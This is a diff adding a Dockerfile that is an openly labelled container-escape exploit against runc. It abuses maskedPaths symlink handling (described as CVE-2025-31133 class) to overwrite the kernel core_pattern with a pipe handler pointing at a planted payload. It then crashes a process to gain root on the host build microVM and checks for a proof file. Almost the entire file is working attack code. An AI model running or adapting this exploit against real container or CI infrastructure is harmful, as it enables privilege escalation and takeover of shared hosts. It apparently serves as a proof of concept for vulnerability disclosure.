@@ -1,0 +1,25 @@
+# front2-runc exploit: runc maskedPaths abuse (CVE-2025-31133 class) -> core_pattern redirect -> root on build microVM
+# Stage mknull: create /dev/null symlink -> global core_pattern sysctl
+FROM alpine:3.20 AS mknull
+RUN mkdir -p /fake/dev && ln -s /proc/sys/kernel/core_pattern /fake/dev/null
+
+# Stage exploit: /dev/null is a symlink at container creation; runc's maskPath() bind-mounts
+# its target (core_pattern) over /proc/kcore etc. Then: write pipe-handler pattern, crash a child.
+FROM alpine:3.20 AS exploit
+COPY --from=mknull /fake/dev/null /dev/null
+COPY front2/scripts/f2_payload /f2p_payload
+RUN echo "=== F2P-EXPLOIT ===" && \
+    ls -la /dev/null && readlink /dev/null && \
+    echo "ulimit-before=$(ulimit -c)" && ulimit -c unlimited; echo "ulimit-after=$(ulimit -c)" && \
+    echo "kcore=[$(head -c 64 /proc/kcore)]" && \
+    ORIG=$(cat /proc/sys/kernel/core_pattern) && echo "orig=[$ORIG]" && \
+    UP=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1) && echo "upperdir=$UP" && \
+    cp /f2p_payload /p && chmod 755 /p && \
+    case "$ORIG" in *" "*|*"|"*) PAT="|$UP/p";; *) PAT="|$UP/p $ORIG";; esac && \
+    echo "pattern=[$PAT]" && \
+    echo "$PAT" > /proc/kcore && echo "written=[$(cat /proc/kcore)]" && \
+    (sh -c 'sleep 0.3; kill -SEGV $$' &) && \
+    sleep 4 && \
+    echo "--- proof check ---" && ls -la /proof.txt 2>&1; cat /proof.txt 2>&1; \
+    echo "$ORIG" > /proc/kcore && echo "restored=[$(cat /proc/kcore)]" && \
+    echo "=== F2P-EXPLOIT-END ==="
